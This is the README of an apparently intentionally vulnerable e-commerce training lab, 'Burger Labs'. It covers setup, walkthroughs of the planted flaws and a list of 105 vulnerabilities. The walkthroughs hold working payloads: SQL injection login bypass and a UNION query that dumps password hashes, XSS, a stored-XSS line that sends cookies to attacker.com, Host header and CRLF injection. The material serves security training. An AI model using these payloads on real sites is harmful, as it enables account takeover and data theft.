🍔 Burger Lab Vulnerable Web Application (BLVWA)

**Cook. Break. Exploit.**  

![Burger Labs Hero](/assets/images/home_login.png)

Welcome to **Burger Labs (BLVWA)**, a production-grade, high-fidelity e-commerce platform designed exclusively for **Cybersecurity Research, Penetration Testing, and Offensive Security Training**. This platform is engineered with a molecularly-inspired architecture, containing **105+ unique intentional vulnerabilities** ranging from classic OWASP Top 10 flaws to complex business logic exploits.

Whether you are a security student, a bug bounty hunter, or an enterprise security architect, Burger Labs provides a realistic, high-stakes environment to sharpen your artisanal exploit skills.

---

## 🚀 Quick Start (Local Deployment)

### 🐋 Option 1: Docker (The Pro Way)
Perfect for a standardized, clean environment. Deploy the entire lab in seconds.
```bash
# 1. Clone the Lab
git clone https://github.com/Amegh3/Burger-Lab-Vulnerable-Web-Application-BLVWA-.git

# 2. Navigate to Project
cd Burger-Lab-Vulnerable-Web-Application-BLVWA-

# 3. Launch with Automated Convenience Script
bash docker-start.sh
```
🔗 **Live URL**: [http://localhost:8000](http://localhost:8000)

### 🛠️ Option 2: PHP Native Server (The Fast Way)
If you have PHP installed locally.
```bash
bash start_lab.sh
```
🔗 **Live URL**: [http://localhost:8000](http://localhost:8000)

---

## 🛡️ Vulnerability Deep Dive (Technical Overview)

This platform is engineered to simulate a **Security Architect's Nightmare**. Unlike basic CTFs, Burger Labs implements vulnerabilities at various layers of the stack:

### 1. The Injection Layer (Critical Severity)
![Menu Vulnerability](/assets/images/menu.png)
*   **SQL Injection (SQLi)**: Found in authentication, search, and order tracking. We use a Mock DB Engine that supports UNION-based, Boolean-blind, and Error-based techniques.
*   **Command Injection (RCE)**: The admin diagnostics tool directly executes system commands (`ping`), allowing for full OS takeover if not properly sanitized.
*   **SSTI (Server-Side Template Injection)**: The analytics engine uses `eval()` on user-supplied template strings, enabling remote code execution within the PHP context.

### 2. The Authorization Layer (High Severity)
![Executive Dashboard](/assets/images/owner_dashboard.png)
*   **BFLA (Broken Function Level Authorization)**: The `/owner/dashboard` and `/staff` portals lack robust role-based access control (RBAC). A simple horizontal or vertical jump allows customers to access executive data.
*   **IDOR (Insecure Direct Object Reference)**: Every "Dossier" and "Profile" is accessible via predictable numerical IDs. Changing `?id=1` to `?id=2` leaks PII, bank accounts, and private notes.
*   **Mass Assignment**: The profile update logic blindly trusts `$_POST` data. Injecting `role=owner` into a profile update request permanently promotes the attacker in the database.

### 3. The Logic & Financial Layer (Moderate Severity)
![Wallet Vulnerability](/assets/images/wallet.png)
*   **Price Tampering**: The Wallet Top-up uses a simulated payment gateway that trusts a hidden `paid_amount` field. Modifying this in transit allows for balance inflation.
*   **Race Conditions**: Concurrent requests to the refund or transfer endpoints can lead to "double spending" or "balance theft" due to non-atomic session updates.

---

## 🧪 Path of the Attacker: Top 10 Walkthroughs

### 1. Broken Authentication (Auth Bypass)
*   **Vector**: Login Portal (`/login`)
*   **Vulnerability**: SQL Injection (Authentication Bypass)
*   **Exploit**: Use the classic Tautology payload.
    *   **Username**: `admin' OR '1'='1`
    *   **Password**: `(Anything)`
*   **Outcome**: You will be logged in as the first user in the database (typically the Administrator).

### 2. Business Logic: Price Manipulation
*   **Vector**: Checkout Workflow (`/checkout/payment` and `/checkout/review`)
*   **Vulnerability**: Parameter Tampering via URL/Hidden Fields.
*   **Exploit**: 
    1. Add items to your cart.
    2. In the `Review` step, look at the URL: `?total=350`.
    3. Modify the URL to: `?total=1`.
    4. Hit Enter. The UI will now reflect ₹1.00 for the entire order.
    5. Finalize the order.
*   **Outcome**: Purchase high-value artisanal burgers for ₹1.

### 3. Wallet Balance Manipulation (Negative Pricing)
*   **Vector**: Checkout Workflow (`/checkout/confirm`)
*   **Vulnerability**: Insufficient Validation of total price.
*   **Exploit**: 
    1. Set the URL total to a negative value: `?total=-500`.
    2. Confirm the order.
*   **Outcome**: The "deduction" logic will perform `Wallet - (-500)`, effectively adding ₹500 to your Burger Labs wallet.

### 4. Insecure Direct Object Reference (IDOR)
*   **Vector**: Order Tracking Dashboard (`/track`)
*   **Vulnerability**: Numeric Incremental IDs with No Ownership Check.
*   **Exploit**: 
    1. Place an order and get your ID (e.g., `BL-1005`).
    2. Increment or decrement the ID (e.g., `BL-1004`, `BL-1001`).
    3. Enter these into the tracking bar.
*   **Outcome**: View the sensitive order details (burger choice, price, status) of other customers.

### 5. Reflected XSS (Cross-Site Scripting)
*   **Vector**: Menu Search (`/menu` or `/search`)
*   **Vulnerability**: Unsanitized output of search queries.
*   **Exploit**: 
    1. Search for: `<script>alert('Vulnerable Lab!')</script>`
    2. The search results page will execute the script.
*   **Outcome**: Ability to hijack sessions or redirect users.

### 6. SQL Injection (Data Exfiltration)
*   **Vector**: Order Tracking Search (`/orders/search`)
*   **Vulnerability**: Unescaped input in SQL LIKE queries.
*   **Exploit**: 
    1. Use a UNION-based payload to leak user credentials.
    2. Payload: `' UNION SELECT 1,username,password_hash,email,5,6,7 FROM users-- -`
*   **Outcome**: Extract the entire user database, including hashed passwords.

### 7. Stored XSS (Admin Portal Hijack)
*   **Vector**: Support/Help Desk (`/help`)
*   **Vulnerability**: Unsanitized storage of complaint descriptions.
*   **Exploit**: 
    1. Submit a complaint with the message: `<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">`.
    2. When an administrator views the ticket in the back-end, their session cookie is leaked.
*   **Outcome**: Administrative account takeover.

### 8. Host Header Injection (Password Reset)
*   **Vector**: Password Reset Portal (`/forgot-password`)
*   **Vulnerability**: Blindly trusting the `Host` header to generate reset links.
*   **Exploit**: 
    1. Go to `/forgot-password`.
    2. Enter an email address.
    3. Intercept the request and change the `Host` header to `attacker.com`.
    4. The generated reset link will now point to `attacker.com`.
*   **Outcome**: Hijack password reset tokens by tricking users into clicking malicious links.

### 9. JWT Authentication Bypass
*   **Vector**: Advanced Lab (`/lab/jwt/1`)
*   **Vulnerability**: Predictable or missing signature validation in the `auth_token` cookie.
*   **Exploit**: 
    1. View the JWT lab page.
    2. Edit the `auth_token` cookie in your browser.
    3. Base64 decode the cookie, change `"role": "customer"` to `"role": "admin"`, and re-encode it.
*   **Outcome**: Vertical privilege escalation to Administrator.

### 10. CRLF Injection (Header Splitting)
*   **Vector**: Advanced Lab (`/lab/crlf/1`)
*   **Vulnerability**: Unsanitized input in the `Location` header.
*   **Exploit**: 
    1. Use the parameter `?url=/%0d%0aSet-Cookie:session=hijacked`.
*   **Outcome**: Session fixation or cookie injection via response header splitting.

### 11. Executive Privilege Escalation (The Owner Breach)
*   **Vector**: User Profile Edit (`/profile/edit`)
*   **Vulnerability**: **Mass Assignment**. The server blindly accepts all POST parameters, including `role`.
*   **Exploit**: 
    1. Login as `guest`.
    2. Go to your Profile Edit page.
    3. Use Burp Suite or Inspect Element to add a new field: `<input type="hidden" name="role" value="owner">`.
    4. Save the profile.
*   **Outcome**: Permanent elevation to **Owner** status. You now have full access to the **Founder's Command Centre** at `/owner/dashboard`, including staff payroll and private executive dossiers.

---

### 💉 Injection & Scripting (1-40)
1. **[Login]** SQL Injection: Classic Tautology Auth Bypass.
2. **[Search]** SQL Injection: UNION-based data exfiltration.
3. **[Tracking]** SQL Injection: Boolean-blind exploitation on Order IDs.
4. **[Help Desk]** Stored XSS: Victim-side script execution.
5. **[Menu]** Reflected XSS: Unsanitized search query reflection.
6. **[Checkout]** Parameter Injection: Overriding total amounts.
7. **[API]** NoSQL-style Injection (Simulated): Bypassing filters.
8. **[Contact]** SMTP Header Injection: Manipulating email metadata.
9. **[Feedback]** HTML Injection: Rendering malicious markup.
10. **[Network]** OS Command Injection: RCE via ping tool.
11. **[Logger]** Log Injection: Forging log entries.
12. **[Newsletter]** CSV Injection: Formulas in exports.
13. **[Profile]** Attribute Injection: Modifying hidden role attributes.
14. **[Review]** Client-side Template Injection (CSTI).
15. **[Cart]** CRLF Injection: Injecting headers via cart parameters.
16. **[Auth]** LDAP Injection (Simulated) on legacy enterprise login.
17. **[Search]** XPath Injection in legacy XML product catalog.
18. **[API]** GraphQL Injection: Introspection queries allowed.
19. **[Checkout]** SSI Injection (Server-Side Includes).
20. **[Help]** Host Header Injection on password reset.
21. **[Auth]** SQLi: Time-based blind on registration form.
22. **[Menu]** XSS: Event handler injection (onclick) in filters.
23. **[Review]** XSS: URI-based (javascript: protocol) in user links.
24. **[Cart]** SQLi: Order-by clause manipulation.
25. **[API]** SQLi: Limit-offset clause manipulation.
26. **[Booking]** SQLi: Insert-based injection in table bookings.
27. **[Auth]** XSS: Document.referrer reflection in login errors.
28. **[Menu]** XSS: Hash-based (fragment) reflection.
29. **[Tracking]** SQLi: Second-order injection in status updates.
30. **[Profile]** XSS: CSS-based injection (expression/url).
31. **[Help]** SQLi: Group-by clause manipulation.
32. **[API]** NoSQL: PHP-array based bypass on login.
33. **[Search]** XSS: Meta-tag injection via page title.
34. **[Contact]** Email Injection: CC/BCC field manipulation.
35. **[Auth]** SQLi: Truncation-based attack on registration.
36. **[Menu]** XSS: Polyglot payload execution.
37. **[Review]** XSS: SVG-based (onload) in avatar upload.
38. **[Cart]** XSS: Mouseover event injection in cart tooltips.
39. **[API]** SQLi: Update-based injection in user preferences.
40. **[Tracking]** XSS: Print-dialog trigger on order receipt.

### 🔓 Access Control & IDOR (41-70)
41. **[Orders]** IDOR: Viewing any user's order details via ID.
42. **[Profile]** IDOR: Modifying other users' profile settings.
43. **[Admin]** Broken Access: Direct access to `/admin_p0rtal`.
44. **[Files]** Directory Traversal: Accessing `/etc/passwd`.
45. **[Uploads]** Unrestricted File Upload: PHP webshell.
46. **[API]** Mass Assignment: Elevating user privileges.
47. **[Checkout]** Insecure Direct Object Reference: Cart takeover.
48. **[Referral]** Forced Browsing: Hidden reward page access.
49. **[API]** Broken Object Level Authorization (BOLA) on user stats.
50. **[Files]** Local File Inclusion (LFI) in page parameter.
51. **[Profile]** IDOR: Deleting other users' accounts.
52. **[Cart]** IDOR: Clearing other users' shopping carts.
53. **[Admin]** Horizontal Privilege Escalation: User-to-User profile access.
54. **[Admin]** Vertical Privilege Escalation: Guest-to-Admin via hidden cookie.
55. **[Auth]** Session Hijacking: Session fixation vulnerability.
56. **[API]** Broken Function Level Authorization: `/api/v1/delete_user`.
57. **[Orders]** Information Disclosure: Exporting order logs.
58. **[Help]** IDOR: Accessing private support tickets.
59. **[Profile]** Insecure Direct Object Reference: Modifying wallet ID.
60. **[API]** Improper Asset Management: Accessing deprecated v0 API.
61. **[Files]** Remote File Inclusion (RFI) via external proxy.
62. **[Admin]** Insecure Direct Object Reference: Accessing server PHPinfo.
63. **[Auth]** Broken Authentication: Bypass via 'Remember Me' cookie.
64. **[API]** Excessive Data Exposure: Returning full user object in search.
65. **[Checkout]** IDOR: Changing delivery address for active orders.
66. **[Admin]** Bypassing WAF: Manipulation of User-Agent headers.
67. **[Help]** IDOR: Resolving other users' complaints.
68. **[API]** Broken Object Property Level Authorization.
69. **[Profile]** IDOR: Viewing sensitive KYC data in hidden fields.
70. **[Admin]** Insecure Direct Object Reference: Accessing internal server logs.

### 🧠 Business Logic & Flow (71-90)
71. **[Checkout]** Price Manipulation: GET parameter tampering.
72. **[Wallet]** Negative Price Attack: Balance inflation.
73. **[Coupons]** Logical Flaw: Infinite reuse of promo codes.
74. **[Inventory]** Oversell Vulnerability: Race condition.
75. **[Refunds]** Double Refund Exploit: Concurrent requests.
76. **[Booking]** Time Conflict Flaw: System lock via overbooking.
77. **[Cart]** Rounding Error: Fractional ₹0 purchase.
78. **[Promo]** Brute-forceable Coupon Logic (short 4-char codes).
79. **[Wallet]** Improper Validation: Transferring more than balance.
80. **[Auth]** Account Lockout Bypass: IP-rotation.
81. **[Referral]** Circular Referral: Self-referral loop for points.
82. **[Checkout]** Step Skip: Accessing `/payment` without `/address`.
83. **[Cart]** Item Duplication: Adding 0.5 items via API.
84. **[Booking]** Guest Booking: Booking without login (Logic Bypass).
85. **[Auth]** Weak Password Policy: 1-character passwords allowed.
86. **[Promo]** Logic Flaw: Stacking multiple non-stackable coupons.
87. **[Wallet]** Negative Transfer: Stealing balance from other users.
88. **[Checkout]** Address Validation Bypass: Empty address allowed.
89. **[Cart]** Price Update Delay: Purchasing at old price after update.
90. **[Auth]** Email Change Without Verification.

### 🔐 Cryptography & Config (91-105)
91. **[Users]** Weak Hashing: MD5 (no salt).
92. **[Sessions]** Predictable Tokens: Sequential IDs.
93. **[Secrets]** Hardcoded Credentials: `config.php.bak`.
94. **[Headers]** Missing Security Headers: CSP/HSTS.
95. **[Debug]** Verbose Error Reporting: Stack traces.
96. **[CORS]** Insecure Policy: Wildcard origin.
97. **[API]** Information Disclosure: `/api/v1/debug`.
98. **[Cookies]** Missing HttpOnly/Secure Flags.
99. **[CDN]** Cache Poisoning: Unkeyed headers.
100. **[Auth]** Lack of Rate Limiting: Brute-force on login.
101. **[XML]** XXE Injection: Franchise portal.
102. **[SSL]** Insecure Renegotiation.
103. **[JS]** Insecure Dependency: Vulnerable jQuery.
104. **[API]** Broken Object Level Authorization (BOLA).
105. **[Server]** Server Side Request Forgery (SSRF): Proxy metadata.



---

## 📜 Legal Disclaimer
Burger Labs is **not a real company**. It is a strictly fictional entity created for security training. Do not use this platform for actual financial transactions or store real-world sensitive data.

---

## 👨‍🔬 Creator Credits
*   **Developer**: Amegh Ayiratt
*   **Contact**: ttariyahgema@gmail.com
*   **LinkedIn**: https://www.linkedin.com/in/ameghayiratt/
